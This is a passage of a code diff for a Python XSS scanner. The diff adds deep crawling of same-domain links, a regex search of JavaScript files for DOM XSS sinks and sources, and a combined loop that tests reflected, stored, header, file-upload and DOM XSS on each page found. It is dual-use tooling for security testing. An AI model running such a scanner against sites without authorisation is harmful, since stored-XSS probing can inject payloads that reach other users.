+                            uploaded_files.append(m)
+                
+                unique_uploaded = []
+                for f in uploaded_files:
+                    if any(ext in f.lower() for ext in ['.svg', '.jpg', '.jpeg', '.png', '.gif', '.html', '.htm']):
+                        file_url = f if f.startswith('http') else urljoin(form['action'], f)
+                        if file_url not in unique_uploaded:
+                            unique_uploaded.append(file_url)
+                
+                for file_url in unique_uploaded:
                     try:
                         file_response = self.session.get(file_url, timeout=self.timeout)
                         file_content = file_response.text
@@ -1035,11 +1300,77 @@ class UniversalXSSScanner:
             with open(filename, 'w') as f:
                 f.write(html_content)
         
-        else:  # txt format (default)
+        else:  
             self.save_results(filename)
     
+    def crawl(self, url, depth=2):
+
+        visited = set()
+        queue = [(url, 0)]
+        found_urls = set([url])
+        
+        print(f"{Fore.YELLOW}[*] Deep crawling (max depth: {depth})...")
+        
+        while queue:
+            curr_url, curr_depth = queue.pop(0)
+            if curr_url in visited or curr_depth > depth:
+                continue
+            
+            visited.add(curr_url)
+            try:
+                response = self.session.get(curr_url, timeout=self.timeout)
+                soup = BeautifulSoup(response.text, 'html.parser')
+                
+                domain = urlparse(self.target_url).netloc
+                for a in soup.find_all('a', href=True):
+                    link = urljoin(curr_url, a['href'])
+                    link_parsed = urlparse(link)
+                    
+                    if link_parsed.netloc == domain:
+
+                        clean_link = urlunparse((link_parsed.scheme, link_parsed.netloc, link_parsed.path, 
+                                               link_parsed.params, link_parsed.query, ''))
+                        if clean_link not in found_urls:
+                            found_urls.add(clean_link)
+                            queue.append((clean_link, curr_depth + 1))
+                            if self.verbose:
+                                print(f"    [Crawler] Found: {clean_link}")
+            except Exception:
+                continue
+        
+        print(f"{Fore.GREEN}[+] Crawler found {len(found_urls)} unique URLs")
+        return list(found_urls)
+
+    def analyze_js_files(self, url, html_content):
+        soup = BeautifulSoup(html_content, 'html.parser')
+        scripts = soup.find_all('script', src=True)
+        
+        findings = []
+        for script in scripts:
+            js_url = urljoin(url, script['src'])
+            try:
+                js_content = self.session.get(js_url, timeout=self.timeout).text
+                
+                sinks = [r'eval\(', r'innerHTML', r'document\.write', r'setTimeout\(', r'setInterval\(']
+                sources = [r'location\.hash', r'location\.search', r'document\.URL']
+                
+                found_sinks = [s for s in sinks if re.search(s, js_content)]
+                found_sources = [s for s in sources if re.search(s, js_content)]
+                
+                if found_sinks and found_sources:
+                    findings.append({
+                        'url': js_url,
+                        'sinks': found_sinks,
+                        'sources': found_sources
+                    })
+                    print(f"{Fore.RED}[!] INSANE: Potential DOM XSS in JS file: {js_url}")
+                    print(f"    Sinks: {', '.join(found_sinks)}")
+                    print(f"    Sources: {', '.join(found_sources)}")
+            except:
+                continue
+        return findings
+
     def scan(self):
-        """Main scanning function"""
         self.print_banner()
         
         print(f"{Fore.CYAN}[*] Target: {self.target_url}")
@@ -1047,147 +1378,101 @@ class UniversalXSSScanner:
         print(f"{Fore.CYAN}[*] Timeout: {self.timeout}s")
         print(f"{Fore.CYAN}[*] Unique ID: {self.unique_id}")
         
-        custom_headers_list = [k for k in self.session.headers.keys() if k not in ['User-Agent']]
-        if custom_headers_list:
-            print(f"{Fore.CYAN}[*] Custom Headers: {', '.join(custom_headers_list)}")
-        
-        if self.verbose:
-            print(f"{Fore.CYAN}[*] Verbose mode: ON")
-        if self.test_all:
-            print(f"{Fore.CYAN}[*] Testing mode: ALL PAYLOADS")
-        else:
-            print(f"{Fore.CYAN}[*] Testing mode: FAST (top payloads only)")
-        print()
-        
         start_time = time.time()
         
-        print(f"{Fore.YELLOW}[Phase 1] Crawling target...")
-        try:
-            response = self.session.get(self.target_url, timeout=self.timeout)
-            html_content = response.text
-            print(f"{Fore.GREEN}[+] Page loaded successfully ({len(html_content)} bytes)")
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error loading page: {e}")
-            return
-        
-        print(f"\n{Fore.YELLOW}[Phase 2] Extracting forms and parameters...")
-        forms = self.get_forms(self.target_url, html_content)
-        url_params = self.get_url_parameters(self.target_url)
-        
-        button_params = {}
-        for form in forms:
-            if form['method'] == 'get':
-                for inp in form['inputs']:
-                    if inp['type'] == 'button' and inp['name'] not in url_params:
-                        button_params[inp['name']] = inp['value']
-        
-        all_url_params = {**url_params, **button_params}
-        
-        print(f"{Fore.GREEN}[+] Found {len(forms)} form(s)")
-        print(f"{Fore.GREEN}[+] Found {len(url_params)} URL parameter(s)")
-        if button_params:
-            print(f"{Fore.GREEN}[+] Found {len(button_params)} button parameter(s)")
-        
-        if not forms and not all_url_params:
-            print(f"{Fore.RED}[!] No forms or parameters found to test!")
-            return
-        
-        print(f"\n{Fore.YELLOW}[Phase 3] Testing Reflected XSS...")
-        test_count = 0
-        
-        with ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = []
-            
-            for param_name, param_value in all_url_params.items():
-                futures.append(
-                    executor.submit(self.test_reflected_xss_url, self.target_url, 
-                                  param_name, param_value)
-                )
-                test_count += 1
-            
-            for form in forms:
-                futures.append(
-                    executor.submit(self.test_reflected_xss_form, form)
-                )
-                test_count += len(form['inputs'])
-            
-            for future in as_completed(futures):
-                results = future.result()
-                if results:
-                    for result in results:
-                        self.vulnerabilities['reflected'].append(result)
-                        print(f"\n{Fore.RED}[!] REFLECTED XSS FOUND!")
-                        print(f"{Fore.RED}    Parameter: {result['param']}")
-                        print(f"{Fore.RED}    Method: {result['method']}")
-                        print(f"{Fore.RED}    Context: {result['context']}")
-        
-        print(f"{Fore.CYAN}[*] Tested {test_count} injection points")
-        
-        print(f"\n{Fore.YELLOW}[Phase 3.5] Testing HTTP Headers XSS...")
-        headers_to_test = ['User-Agent', 'Referer']
-        for header in headers_to_test:
-            results = self.test_header_xss(self.target_url, header)
-            if results:
-                for result in results:
-                    if result['type'] == 'stored':
-                        self.vulnerabilities['stored'].append(result)
-                        print(f"\n{Fore.RED}[!] STORED XSS via {header} FOUND!")
-                        print(f"{Fore.RED}    URL: {result['url']}")
-                        print(f"{Fore.RED}    Vector: {result['param']}")
-                        print(f"{Fore.RED}    Context: {result['context']}")
-                        print(f"{Fore.RED}    Impact: CRITICAL - Affects ALL users!")
-                    else:
-                        self.vulnerabilities['reflected'].append(result)
-                        print(f"\n{Fore.YELLOW}[!] REFLECTED XSS via {header} FOUND!")
-                        print(f"{Fore.YELLOW}    URL: {result['url']}")
-                        print(f"{Fore.YELLOW}    Vector: {result['param']}")
-        
-        if self.test_all and forms:
-            print(f"\n{Fore.YELLOW}[Phase 4] Testing Stored XSS via Forms...")
-            for form in forms:
-                results = self.test_stored_xss(form)
-                if results:
-                    for result in results:
-                        self.vulnerabilities['stored'].append(result)
-                        print(f"\n{Fore.RED}[!] STORED XSS FOUND!")
-                        print(f"{Fore.RED}    Parameter: {result['param']}")
-                        print(f"{Fore.RED}    Context: {result['context']}")
-        
-        if forms:
-            file_forms = [f for f in forms if any(inp['type'] == 'file' for inp in f['inputs'])]
-            if file_forms:
-                print(f"\n{Fore.YELLOW}[Phase 4.5] Testing File Upload XSS...")
-                print(f"{Fore.CYAN}[*] Found {len(file_forms)} form(s) with file upload")
+        if self.do_crawl:
+            all_targets = self.crawl(self.target_url)
+        else:
+
+            print(f"{Fore.YELLOW}[*] Shallow crawling target page...")
+            all_targets = [self.target_url]
+            try:
+                response = self.session.get(self.target_url, timeout=self.timeout)
+                soup = BeautifulSoup(response.text, 'html.parser')
+                domain = urlparse(self.target_url).netloc
                 
-                for form in file_forms:
-                    results = self.test_file_upload_xss(form)
-                    if results:
-                        for result in results:
-                            self.vulnerabilities['file_upload'].append(result)
-                            print(f"\n{Fore.RED}[!] FILE UPLOAD XSS!")
-                            print(f"{Fore.RED}    URL: {result['url']}")
-                            print(f"{Fore.RED}    Field: {result.get('field', 'N/A')}")
-                            print(f"{Fore.RED}    File: {result.get('file', 'N/A')}")
-                            if result.get('uploaded_url'):
-                                print(f"{Fore.RED}    Uploaded: {result['uploaded_url']}")
-                            print(f"{Fore.RED}    Payload: {result.get('payload', 'XSS in file metadata')}")
+                for a in soup.find_all('a', href=True):
+                    link = urljoin(self.target_url, a['href'])
+                    link_parsed = urlparse(link)
+                    if link_parsed.netloc == domain:
+                        clean_link = urlunparse((link_parsed.scheme, link_parsed.netloc, link_parsed.path, 
+                                               link_parsed.params, link_parsed.query, ''))
+                        if clean_link not in all_targets:
+                            all_targets.append(clean_link)
+                print(f"{Fore.GREEN}[+] Found {len(all_targets)} endpoints on target page")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error during shallow crawl: {e}")
         
-        print(f"\n{Fore.YELLOW}[Phase 5] Testing DOM-based XSS...")
-        dom_results = self.test_dom_based_xss(self.target_url)
-        if dom_results:
-            for result in dom_results:
-                self.vulnerabilities['dom_based'].append(result)
-                print(f"\n{Fore.YELLOW}[!] POTENTIAL DOM-BASED XSS!")
-                print(f"{Fore.YELLOW}    URL: {result['url']}")
-                print(f"{Fore.YELLOW}    Evidence: {result['evidence']}")
-        
+        for target_url in all_targets:
+            print(f"\n{Fore.MAGENTA}[Target] Scanning: {target_url}")
+            
+            try:
+                response = self.session.get(target_url, timeout=self.timeout)
+                html_content = response.text
+                print(f"{Fore.GREEN}[+] Page loaded ({len(html_content)} bytes)")
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error loading {target_url}: {e}")
+                continue
+
+            forms = self.get_forms(target_url, html_content)
+            url_params = self.get_url_parameters(target_url)
+
+            if self.test_all:
+                for cp in self.common_params:
+                    if cp not in url_params:
+                        url_params[cp] = 'test'
+
+            js_findings = self.analyze_js_files(target_url, html_content)
+            for finding in js_findings:
+                self.vulnerabilities['dom_based'].append({
+                    'url': finding['url'],
+                    'param': 'JS Sink',
+                    'method': 'JS_ANALYSIS',
+                    'context': f"Sinks: {finding['sinks']}",
+                    'evidence': f"Sources found in same file: {finding['sources']}"
+                })
+
+            print(f"{Fore.GREEN}[+] Found {len(forms)} form(s) and {len(url_params)} URL param(s)")
+
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                futures = []
+
+                for param_name, param_value in url_params.items():
+                    futures.append(executor.submit(self.test_reflected_xss_url, target_url, param_name, param_value))
+
+                for form in forms:
+                    futures.append(executor.submit(self.test_reflected_xss_form, form))
+
+                    if self.test_all:
+                        futures.append(executor.submit(self.test_stored_xss, form))
+
+                    if any(inp['type'] == 'file' for inp in form['inputs']):
+                        futures.append(executor.submit(self.test_file_upload_xss, form))
+
+                futures.append(executor.submit(self.test_header_xss, target_url))
+
+                futures.append(executor.submit(self.test_dom_based_xss, target_url))
+                
+                for future in as_completed(futures):
+                    try:
+                        results = future.result()
+                        if results:
+                            for result in results:
+                                vuln_type = result.get('type', 'reflected')
+                                if result not in self.vulnerabilities[vuln_type]:
+                                    self.vulnerabilities[vuln_type].append(result)
+                                    print(f"\n{Fore.RED}[!] {vuln_type.upper()} XSS FOUND!")
+                                    print(f"{Fore.RED}    URL: {result['url']}")
+                                    print(f"{Fore.RED}    Param: {result['param']}")
+                                    print(f"{Fore.RED}    Context: {result['context']}")
+                    except Exception:
+                        continue
+
         elapsed_time = time.time() - start_time
         self.print_summary(elapsed_time)
-        
         self.save_results()
     
     def print_summary(self, elapsed_time):
-        """Print summary hasil scan"""
         total_vulns = (len(self.vulnerabilities['reflected']) + 
                       len(self.vulnerabilities['stored']) +
                       len(self.vulnerabilities['file_upload']) + 
@@ -1211,11 +1496,11 @@ class UniversalXSSScanner:
             print(f"{Fore.GREEN}[+] No XSS vulnerabilities found.\n")
     
     def get_working_payload(self, payload, context):
-        """Return actual working payload that was detected"""
+
         return [payload]
     
     def save_results(self):
-        """Save hasil scan ke file dengan format simpel"""
+
         if not any(self.vulnerabilities.values()):
             return
         
@@ -1266,10 +1551,13 @@ class UniversalXSSScanner:
                             f.write(f"   Method: {vuln['method']}\n")
                             f.write(f"   Context: {vuln['context']}\n")
                             
+                            payload = vuln.get('payload', 'N/A')
                             if 'payloads' in vuln and len(vuln['payloads']) > 1:
                                 working_payloads = vuln['payloads']
+                            elif payload != 'N/A':
+                                working_payloads = self.get_working_payload(payload, vuln['context'])
                             else:
-                                working_payloads = self.get_working_payload(vuln['payload'], vuln['context'])
+                                working_payloads = ["N/A (Analysis-based)"]
                             
                             if len(working_payloads) == 1:
                                 f.write(f"   Payload: {working_payloads[0]}\n")
@@ -1278,7 +1566,7 @@ class UniversalXSSScanner:
                                 for wp in working_payloads:
                                     f.write(f"      - {wp}\n")
                             
-                            if vuln['method'] == 'GET':
+                            if vuln['method'] == 'GET' and payload != 'N/A':
                                 parsed_url = urlparse(vuln['url'])
                                 params = parse_qs(parsed_url.query)
                                 
@@ -1326,6 +1614,7 @@ Examples:
     parser.add_argument('target_url', help='Target URL to scan')
     parser.add_argument('-a', '--all', action='store_true', dest='test_all',
                         help='Test with ALL payloads (slower but comprehensive)')
+    parser.add_argument('--crawl', action='store_true', help='Perform deep crawling to find more endpoints')
     parser.add_argument('-H', '--header', action='append', dest='headers', 
                         help='Add custom header (format: "Key: Value")')
     parser.add_argument('--threads', type=int, default=10, help='Number of threads (default: 10)')
@@ -1347,7 +1636,8 @@ Examples:
         timeout=args.timeout,
         test_all=args.test_all,
         custom_headers=custom_headers,
-        verbose=args.verbose
+        verbose=args.verbose,
+        do_crawl=args.crawl
     )
     
     scanner.scan()
